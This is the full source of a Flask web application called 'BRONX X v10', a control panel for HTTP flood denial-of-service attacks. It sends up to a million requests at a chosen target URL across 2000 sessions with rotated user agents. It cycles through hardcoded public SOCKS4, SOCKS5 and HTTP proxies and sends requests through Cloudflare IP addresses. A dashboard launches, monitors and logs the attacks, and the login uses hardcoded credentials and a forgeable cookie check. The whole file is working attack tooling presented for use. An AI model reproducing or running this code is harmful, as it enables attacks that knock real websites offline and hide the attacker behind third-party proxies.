from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []

# ⚡ Cloudflare IP Range
CF_IPS = [
    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
    "104.16.0.1","104.16.0.2","104.16.0.3","104.16.0.4",
    "172.67.0.1","172.67.0.2","172.67.0.3","172.67.0.4",
]

# 🔒 SOCKS5 Proxies
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
]

# 🔒 SOCKS4 Proxies
SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
]

# 🌐 HTTP/HTTPS Proxies
HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

# User Custom Proxies
custom_proxies = []
proxy_enabled = True
multi_session_enabled = True
requests_per_proxy = 100  # 1 proxy = 100 requests

# ============================================
# 🎨 NEW ULTRA DARK THEME
# ============================================
LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BRONX X | v10</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,rgba(255,0,0,0.03) 25%,transparent 25%,transparent 75%,rgba(255,0,0,0.03) 75%),linear-gradient(-45deg,rgba(255,0,0,0.03) 25%,transparent 25%,transparent 75%,rgba(255,0,0,0.03) 75%);background-size:60px 60px;animation:bgScroll 20s linear infinite}
@keyframes bgScroll{0%{background-position:0 0}100%{background-position:60px 60px}}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.1) 0px,rgba(0,0,0,0.1) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999}
.box{background:rgba(5,0,0,0.95);padding:45px;border-radius:20px;border:2px solid rgba(255,0,0,0.4);width:400px;text-align:center;z-index:1;box-shadow:0 0 80px rgba(255,0,0,0.2),0 0 200px rgba(255,0,0,0.05),inset 0 0 60px rgba(255,0,0,0.03);position:relative}
.box::before{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;border-radius:22px;background:linear-gradient(45deg,#ff0000,#ff4444,#ff0000,#ff4444);z-index:-1;animation:borderRotate 4s linear infinite;opacity:0.6;filter:blur(8px)}
@keyframes borderRotate{0%{filter:blur(8px) hue-rotate(0deg)}100%{filter:blur(8px) hue-rotate(360deg)}}
.logo{font-size:4em;animation:glitch 2s infinite}@keyframes glitch{0%,100%{transform:translate(0)}20%{transform:translate(-3px,3px)}40%{transform:translate(3px,-3px)}60%{transform:translate(-3px,-3px)}80%{transform:translate(3px,3px)}}
h1{font-size:2em;font-weight:900;background:linear-gradient(180deg,#ff0000,#ff6666,#ff0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px;text-shadow:none}
.tag{color:#ff4444;font-size:0.7em;letter-spacing:5px;text-transform:uppercase;margin:10px 0}
input{width:100%;padding:15px;background:rgba(0,0,0,0.8);border:1px solid rgba(255,0,0,0.3);border-radius:10px;color:#ff4444;margin:10px 0;font-family:'Courier New',monospace;font-size:14px;transition:0.3s}
input:focus{border-color:#ff0000;box-shadow:0 0 25px rgba(255,0,0,0.3);outline:none}
.btn{width:100%;padding:15px;background:linear-gradient(135deg,#cc0000,#ff0000);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:15px;letter-spacing:3px;text-transform:uppercase;transition:0.3s}
.btn:hover{box-shadow:0 0 40px #ff0000;transform:translateY(-2px)}.btn:active{transform:scale(0.96)}
</style></head><body>
<div class="scanline"></div>
<div class="box">
<div class="logo">💀</div>
<h1>BRONX X</h1>
<div class="tag">⚡ ULTRA v10.0 ⚡</div>
<p style="color:#666;font-size:0.6em;letter-spacing:2px">2000 SESSIONS • MULTI-PROXY • GOD MODE</p>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:#ff0000;margin-top:10px;font-size:0.8em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BRONX X | v10</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:12px;line-height:1.4}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.08) 0px,rgba(0,0,0,0.08) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999}
.container{max-width:1300px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:18px 25px;border:2px solid rgba(255,0,0,0.4);border-radius:14px;margin-bottom:18px;background:rgba(10,0,0,0.9);flex-wrap:wrap;gap:12px;box-shadow:0 0 40px rgba(255,0,0,0.1)}
.header h1{font-size:1.6em;font-weight:900;background:linear-gradient(180deg,#ff0000,#ff6666);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
.stat{background:rgba(10,0,0,0.9);border:1px solid rgba(255,0,0,0.2);border-radius:12px;padding:18px;text-align:center;transition:0.3s}.stat:hover{border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.2)}
.stat-val{font-size:2.2em;font-weight:900}.s{color:#00ff44}.f{color:#ff0000}.t{color:#ff8800}
.stat-label{font-size:0.6em;text-transform:uppercase;letter-spacing:3px;color:#666;margin-top:4px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(370px,1fr));gap:14px;margin-bottom:18px}
.card{background:rgba(10,0,0,0.9);border:1px solid rgba(255,0,0,0.2);border-radius:12px;padding:20px;transition:0.3s}.card:hover{border-color:rgba(255,0,0,0.5);box-shadow:0 0 25px rgba(255,0,0,0.08)}
.card h3{font-size:0.8em;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;color:#ff4444}
input,select,textarea{width:100%;padding:10px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(255,0,0,0.2);border-radius:7px;color:#ff4444;margin:4px 0;font-size:12px;font-family:'Courier New',monospace;transition:0.3s}
input:focus,select:focus,textarea:focus{border-color:#ff0000;box-shadow:0 0 15px rgba(255,0,0,0.2);outline:none}
label{font-size:0.55em;text-transform:uppercase;letter-spacing:1.5px;color:#888;display:block;margin-top:8px}
.btn{width:100%;padding:11px;background:linear-gradient(135deg,#cc0000,#ff0000);color:#fff;border:none;border-radius:7px;font-weight:700;cursor:pointer;font-size:0.7em;letter-spacing:1.5px;text-transform:uppercase;transition:0.3s;margin:4px 0}
.btn:hover{box-shadow:0 0 30px #ff0000;transform:translateY(-1px)}.btn:active{transform:scale(0.97)}
.btn-stop{background:#222;color:#ff0000;border:1px solid #ff0000}.btn-stop:hover{box-shadow:0 0 25px rgba(255,0,0,0.3)}
.btn-green{background:linear-gradient(135deg,#00aa00,#00ff00);color:#000}.btn-green:hover{box-shadow:0 0 25px #00ff00}
.btn-orange{background:linear-gradient(135deg,#cc6600,#ff8800);color:#000}.btn-orange:hover{box-shadow:0 0 25px #ff8800}
.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
.logs{background:rgba(0,0,0,0.8);border:1px solid rgba(255,0,0,0.1);border-radius:8px;padding:12px;max-height:300px;overflow:auto;font-size:0.65em;font-family:'Courier New',monospace;color:#00ff44}
.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.01);color:#aaa}
.badge{display:inline-block;padding:4px 12px;border-radius:14px;font-size:0.55em;letter-spacing:1.5px;text-transform:uppercase}
.badge-on{background:rgba(0,255,68,0.1);color:#00ff44;border:1px solid rgba(0,255,68,0.2)}
.badge-off{background:rgba(255,0,0,0.1);color:#ff0000;border:1px solid rgba(255,0,0,0.2)}
.badge-active{background:rgba(255,0,0,0.1);color:#ff0000;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.3}}
.toggle-row{display:flex;align-items:center;gap:8px;margin:6px 0}
.toggle{width:40px;height:22px;background:#333;border-radius:11px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#00ff44;box-shadow:0 0 15px rgba(0,255,68,0.3)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:18px;height:18px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:20px}
</style></head><body>
<div class="scanline"></div>
<div class="container">
<div class="header">
<div><h1>💀 BRONX X v10.0</h1><div style="color:#888;font-size:0.55em;letter-spacing:2px">2000 SESSIONS • MULTI-PROXY • SOCKS4/5/HTTP</div></div>
<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
<span id="proxyBadge" class="badge badge-on">🛡️ PROXY ON</span>
<span id="multiBadge" class="badge badge-on">⚡ MULTI ON</span>
<a href="/logout" style="color:#ff0000;text-decoration:none;font-size:0.65em;letter-spacing:1.5px;font-weight:700">EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK CONFIG</h3>
<label>🎯 TARGET URL</label><input type="text" id="url" placeholder="https://target.com/api">
<div class="row"><div><label>📊 REQUESTS</label><input type="number" id="count" value="10000"></div><div>
<label>⚡ SPEED</label><select id="speed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="ultra">💀 Ultra</option></select>
</div></div>
<label>🛡️ ATTACK MODE</label><select id="mode">
<option value="direct">⚡ DIRECT (Fastest)</option>
<option value="cf">🌐 CF IP Rotation</option>
<option value="socks5">🔒 SOCKS5 Proxy</option>
<option value="socks4">🔒 SOCKS4 Proxy</option>
<option value="http">🌐 HTTP Proxy</option>
<option value="mixed">💀 MIXED (All Proxies)</option>
<option value="all" selected>☠️ ALL METHODS</option>
</select>
<button class="btn" onclick="start()">🚀 LAUNCH ATTACK</button>
<button class="btn btn-stop" onclick="stop()">⏹️ TERMINATE</button>
<div id="status" style="margin-top:6px;text-align:center"></div>
</div>

<div class="card">
<h3>⚡ MULTI-SESSION + PROXY SYSTEM</h3>
<div class="toggle-row"><span style="font-size:0.65em;color:#888">Multi-Session (2000)</span><div class="toggle on" id="multiToggle" onclick="toggleMulti()"></div><span id="multiLabel" style="font-size:0.65em;color:#00ff44">ON</span></div>
<div class="toggle-row"><span style="font-size:0.65em;color:#888">Proxy System</span><div class="toggle on" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.65em;color:#00ff44">ON</span></div>
<label>REQUESTS PER PROXY</label><input type="number" id="rpp" value="100">
<label>CUSTOM PROXIES (IP:PORT per line)</label>
<textarea id="customProxies" rows="3" placeholder="socks5://127.0.0.1:1080&#10;socks4://127.0.0.1:1080&#10;http://proxy.com:8080&#10;https://proxy.com:443"></textarea>
<button class="btn btn-orange" onclick="saveProxies()">💾 SAVE PROXIES</button>
<button class="btn btn-green" onclick="testProxies()">🔍 TEST ALL PROXIES</button>
<div id="proxyTestResult" style="margin-top:6px;font-size:0.6em;text-align:center"></div>
</div>

<div class="card">
<h3>📊 LIVE STATS</h3>
<div class="row3">
<div class="stat"><div class="stat-val t" style="font-size:1.3em" id="successRate">0%</div><div class="stat-label">RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.3em" id="rps">0</div><div class="stat-label">REQ/S</div></div>
<div class="stat"><div class="stat-val" style="font-size:1.3em;color:#ff8800" id="proxyCount">0</div><div class="stat-label">PROXIES</div></div>
</div>
</div>
</div>

<div class="card"><h3>📜 DETAILED BATTLE LOGS</h3><div class="logs" id="logs"><div class="log-e">⚡ 2000 Multi-Session System Ready</div><div class="log-e">🔒 Proxy Pool: SOCKS4/5 + HTTP/HTTPS</div><div class="log-e">🔄 1 Proxy = 100 Requests Rotation</div><div class="log-e">💀 System Armed. Awaiting command...</div></div></div>
</div>

<script>
var proxyOn=true,multiOn=true,lastTotal=0,lastTime=Date.now();

function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF';document.getElementById('proxyLabel').style.color=proxyOn?'#00ff44':'#ff0000';document.getElementById('proxyBadge').className=proxyOn?'badge badge-on':'badge badge-off';document.getElementById('proxyBadge').textContent=proxyOn?'🛡️ PROXY ON':'⚠️ PROXY OFF';fetch('/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxy:proxyOn,multi:multiOn})})}

function toggleMulti(){multiOn=!multiOn;document.getElementById('multiToggle').classList.toggle('on',multiOn);document.getElementById('multiLabel').textContent=multiOn?'ON':'OFF';document.getElementById('multiLabel').style.color=multiOn?'#00ff44':'#ff0000';document.getElementById('multiBadge').className=multiOn?'badge badge-on':'badge badge-off';document.getElementById('multiBadge').textContent=multiOn?'⚡ MULTI ON':'⚠️ MULTI OFF';fetch('/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxy:proxyOn,multi:multiOn})})}

function saveProxies(){var p=document.getElementById('customProxies').value;var rpp=document.getElementById('rpp').value;fetch('/save_settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p,rpp:parseInt(rpp)})}).then(r=>r.json()).then(d=>{alert('✅ '+d.count+' proxies saved | '+d.rpp+' req/proxy');document.getElementById('proxyCount').textContent=d.count})}

function testProxies(){document.getElementById('proxyTestResult').innerHTML='<span style="color:#ff8800">⏳ Testing proxies...</span>';fetch('/test_proxies').then(r=>r.json()).then(d=>{document.getElementById('proxyTestResult').innerHTML='<span style="color:#00ff44">✅ Working: '+d.working+'/'+d.total+'</span>'})}

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-lastTime;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=n;}
})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
if(!url){alert('Enter URL!');return}
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
document.getElementById('status').innerHTML='<span class="badge badge-active">⚡ ATTACKING</span>';l();u()})}

function stop(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#888">⏹️ STOPPED</span>';l()})}

setInterval(function(){l();u()},1000)
</script></body></html>"""

# ============================================
# ⚡ 2000 MULTI-SESSION SYSTEM
# ============================================
session_pool = []
MAX_SESSIONS = 2000

def create_session():
    """Create a fresh session with unique identity"""
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
    })
    return s

def init_sessions():
    global session_pool
    print(f"⚡ Creating {MAX_SESSIONS} sessions...")
    session_pool = [create_session() for _ in range(MAX_SESSIONS)]
    print(f"✅ {len(session_pool)} sessions ready!")

def get_session():
    if len(session_pool) < 100:
        session_pool.extend([create_session() for _ in range(200)])
    return random.choice(session_pool)

# ============================================
# 💀 ATTACK ENGINE WITH PROXY ROTATION
# ============================================
def get_all_proxies():
    """Get all available proxies"""
    all_p = []
    if proxy_enabled:
        all_p.extend([("socks5", p) for p in SOCKS5_PROXIES])
        all_p.extend([("socks4", p) for p in SOCKS4_PROXIES])
        all_p.extend([("http", p) for p in HTTP_PROXIES])
        for cp in custom_proxies:
            if cp.startswith("socks5://"):
                all_p.append(("socks5", cp.replace("socks5://","")))
            elif cp.startswith("socks4://"):
                all_p.append(("socks4", cp.replace("socks4://","")))
            elif cp.startswith("https://"):
                all_p.append(("https", cp.replace("https://","")))
            elif cp.startswith("http://"):
                all_p.append(("http", cp.replace("http://","")))
            else:
                all_p.append(("socks5", cp))
    return all_p

def send_request(url, session, mode, proxy_info=None):
    """Send request with proxy support"""
    try:
        proxies = None
        if proxy_info:
            ptype, paddr = proxy_info
            if ptype == "socks5":
                proxies = {"http": f"socks5://{paddr}", "https": f"socks5://{paddr}"}
            elif ptype == "socks4":
                proxies = {"http": f"socks4://{paddr}", "https": f"socks4://{paddr}"}
            elif ptype in ["http", "https"]:
                proxies = {"http": f"http://{paddr}", "https": f"http://{paddr}"}
        
        if mode == "direct":
            session.get(url, timeout=10, verify=False)
        elif mode == "cf":
            cf_ip = random.choice(CF_IPS)
            headers = {"Host": url.split("//")[-1].split("/")[0]}
            session.get(f"https://{cf_ip}/", headers=headers, timeout=10, verify=False)
        else:
            session.get(url, proxies=proxies, timeout=15, verify=False)
        return True
    except:
        return False

def attack_worker_multi(attack_id, url, count, speed, mode):
    """Multi-session attack worker with proxy rotation"""
    delays = {"slow": 0.1, "fast": 0.01, "ultra": 0.001}
    delay = delays.get(speed, 0.01)
    
    session = get_session()
    all_proxies = get_all_proxies()
    proxy_index = 0
    req_count = 0
    
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # Proxy rotation: 1 proxy = requests_per_proxy requests
        proxy_info = None
        if proxy_enabled and all_proxies:
            if req_count >= requests_per_proxy:
                proxy_index = (proxy_index + 1) % len(all_proxies)
                req_count = 0
                session = get_session()  # New session with new proxy
            proxy_info = all_proxies[proxy_index]
            req_count += 1
        
        # Mode selection
        current_mode = mode
        if mode == "all":
            current_mode = random.choice(["direct", "cf", "socks5", "socks4", "http"])
        elif mode == "mixed":
            current_mode = random.choice(["cf", "socks5", "http"])
        
        if send_request(url, session, current_mode, proxy_info):
            success += 1
        else:
            fail += 1
        
        # Detailed logging
        if i % 100 == 0 and i > 0:
            proxy_str = f"{proxy_info[0]}://{proxy_info[1]}" if proxy_info else "DIRECT"
            attack_logs.append(f"📊 [{current_mode.upper()}] ✅{success} ❌{fail} | Proxy: {proxy_str} | {i}/{count}")
        
        if delay > 0:
            time.sleep(delay)
    
    return success, fail

def run_attack_multi(attack_id, url, count, speed, mode):
    """Run attack with multi-session support"""
    if multi_session_enabled:
        workers = min(100, MAX_SESSIONS // 10)
    else:
        workers = 5
    
    req_per_worker = max(1, count // workers)
    
    all_proxies = get_all_proxies()
    attack_logs.append(f"🔥 TARGET: {url[:50]}... | {count} REQ | {speed.upper()} | {mode.upper()}")
    attack_logs.append(f"⚡ Multi-Session: {'ON ('+str(workers)+' workers)' if multi_session_enabled else 'OFF'}")
    attack_logs.append(f"🔒 Proxies: {len(all_proxies)} | {requests_per_proxy} req/proxy")
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(attack_worker_multi, attack_id, url, req_per_worker, speed, mode) for _ in range(workers)]
        
        total_s = 0
        total_f = 0
        
        for future in as_completed(futures):
            try:
                s, f = future.result(timeout=300)
                total_s += s
                total_f += f
            except:
                pass
    
    attack_stats["success"] += total_s
    attack_stats["failed"] += total_f
    attack_stats["total"] += total_s + total_f
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"🏁 COMPLETE: ✅{total_s} ❌{total_f} | TOTAL: {total_s+total_f}")

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),1000000)
    speed = d.get('speed','fast')
    mode = d.get('mode','all')
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack_multi, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("⏹️ ATTACK TERMINATED")
    return jsonify({"status":"stopped"})

@app.route('/settings', methods=['POST'])
def settings():
    global proxy_enabled, multi_session_enabled
    d = request.get_json()
    proxy_enabled = d.get('proxy', True)
    multi_session_enabled = d.get('multi', True)
    return jsonify({"status":"saved"})

@app.route('/save_settings', methods=['POST'])
def save_settings():
    global custom_proxies, requests_per_proxy
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    requests_per_proxy = int(d.get('rpp', 100))
    attack_logs.append(f"💾 {len(custom_proxies)} proxies saved | {requests_per_proxy} req/proxy")
    return jsonify({"count":len(custom_proxies),"rpp":requests_per_proxy})

@app.route('/test_proxies')
def test_proxies():
    all_p = get_all_proxies()
    working = 0
    for ptype, paddr in all_p[:20]:
        try:
            if ptype == "socks5":
                proxies = {"http": f"socks5://{paddr}", "https": f"socks5://{paddr}"}
            elif ptype == "socks4":
                proxies = {"http": f"socks4://{paddr}", "https": f"socks4://{paddr}"}
            else:
                proxies = {"http": f"http://{paddr}", "https": f"http://{paddr}"}
            r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
            if r.status_code == 200: working += 1
        except: pass
    return jsonify({"working":working,"total":min(20,len(all_p))})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BRONX X v10.0 - 2000 Sessions")
    init_sessions()
    print(f"⚡ Sessions: {len(session_pool)}")
    print(f"🔒 Proxies: {len(get_all_proxies())}")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
